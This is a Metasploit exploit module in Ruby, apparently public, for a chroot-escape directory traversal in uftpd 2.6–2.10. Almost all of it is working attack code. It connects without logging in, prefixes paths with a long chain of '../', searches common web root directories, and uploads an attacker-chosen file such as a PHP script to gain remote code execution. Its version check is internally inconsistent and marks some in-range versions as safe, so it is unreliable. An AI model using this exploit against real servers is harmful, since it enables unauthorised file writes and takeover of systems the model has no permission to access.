##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'uftpd 2.6-2.10 Directory Traversal (Chroot Escape)',
      'Description'    => %q{
          This module exploits a directory traversal vulnerability in versions 2.6 to
        2.10 of uftpd server. The vulnerability is within the "compose_abspath" function
        within the "src/common.c" file.

        Every FTP command that I have tested is vulnerable because they use the same
        chroot jailing function, "compose_abspath". The easiest to obtain remove code
        execution with is the "STOR" command (writing files to webserver root).

        It enables unauthenticated arbitrary file read and write operations by escaping
        the faulty chroot jail put in place by uftpd. Although this module is geared
        towards uploading .php files to a web application to obtain remote code
        execution with, it supports any file type to any directory.

        No authentication is required to use any of the vulnerable file I/O commands
        as uftpd relies on local filesystem permissions (which as bypassed as the
        chroot jail is escaped)

        My first Metasploit module! :)
      },
      'Author'         =>
        [
          'arinerron <msf@aaronesau.com>',  # discovery and metasploit module
        ],
      'References'     =>
        [
          # CVE-2019-???? # CVE ID pending
          [ 'URL', 'https://aaronesau.com/blog/posts/6' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
          'PrependChrootBreak' => true
        },
      'Targets' =>
        [
          [ 'Automatic Targeting', { 'auto' => true } ],
          [ "uftpd <=2.10", {} ]
        ],
      'DefaultTarget' => 0,
      'Privileged'     => false,
      'Platform'       => [ 'linux' ],
      'DisclosureDate' => 'Aug 29 2019'))

    register_options(
      [
        OptPath.new('SRCFILE', [ true, 'The source file to copy to the server' ]),
        OptString.new('DESTDIR', [ false, 'A writable *directory* on the target host', nil ]) # nil will make the module search for a webserver directory
      ])
  end


  def check
    connect # no need to login

    vprint_status("FTP Banner: #{banner.strip}")

    status = CheckCode::Safe

    # vulnerable: uftpd 2.6-2.10
    if banner =~ /uftpd \((2\.(10|[6-9])).*\)/i
      ver = $1
      maj, min = ver.split('.')

      case maj
      when '1'
        status = CheckCode::Appears
      when '2'
        status = CheckCode::Appears

        if min.length > 0
          if min.to_i < 8
            status = CheckCode::Appears
          else
            status = CheckCode::Safe
          end
        end
      else
          status = CheckCode::Detected
      end
    end

    disconnect
    return status
  end


  def exploit
    status = check

    data = ''

    if datastore['SRCFILE'] != nil
      f = File.open(datastore['SRCFILE'], "rb")
      data = f.read
      f.close
    else
      fail_with(Failure::Unknown, "SRCFILE cannot be nil")
    end

    connect # no need to login

    # we don't know (and have no way to identify) how far the chroot dir is in
    prefix = "../" * 32

    check_directories = [ "srv/http", "var/www/html", "web", "www", "srv/www-data", "var/www", "srv/www", "srv" ] # common webserver directories

    if (datastore['DESTDIR']) != nil
      check_directories = [ datastore['DESTDIR'] ]
    end

    found_one = false

    # try each one just in case
    check_directories.each_index {|i|
      dirname = check_directories[i]
      dir = prefix + dirname + '/'
      dirfile = dir + File::basename(datastore['SRCFILE'])

      # let's check if the directory even exists first
      data_connect(mode = nil)
      res = send_cmd_data([ 'LIST', dir ], nil)

      if res and res[0] && res[0] !~ /550 No such file or directory/ # also handles permission issues
        # directory exists, yay! :)
        found_one = true

        ilog("Directory " + dir + " exists.")

        # upload the file
        data_connect(mode = nil)
        res = send_cmd_data([ 'PUT', dirfile ], data, 'I')

        # did it upload successfully?
        if res and res[0] and res[0] !~ /226 Transfer complete/
          wlog("Directory exists and we have permissions, but couldn't upload to " + dirfile + " :(")
        else
          dlog("Looks like we were able to upload the file to " + dirfile + ", double checking...")

          basename = File::basename(datastore['SRCFILE'])

          data_connect(mode = nil)
          res = send_cmd_data([ 'LIST', dir ], nil)

          if res and res[1] and res[1].include? basename
            ilog("File uploaded to " + dirfile)
          else
            elog("Failed to upload file to " + dirfile)
          end

          # double check
        end

      else
        dlog("Directory " + dirname + " does not exist.")
      end
    }
    disconnect

  end
end
